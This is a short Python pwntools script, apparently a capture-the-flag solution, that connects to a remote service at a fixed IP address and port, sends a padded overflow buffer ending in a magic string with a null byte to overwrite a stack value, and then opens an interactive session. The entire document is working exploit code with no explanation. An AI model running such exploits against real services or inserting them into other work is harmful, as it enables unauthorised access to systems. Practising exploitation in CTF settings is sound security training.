from pwn import *

context(arch = 'i386', os = 'linux')

sh = remote("47.103.214.163", 20000)

sh.send((0xac-0x31)*'a'+'0O0o\x00O0\n')

sh.interactive()

sh.close()
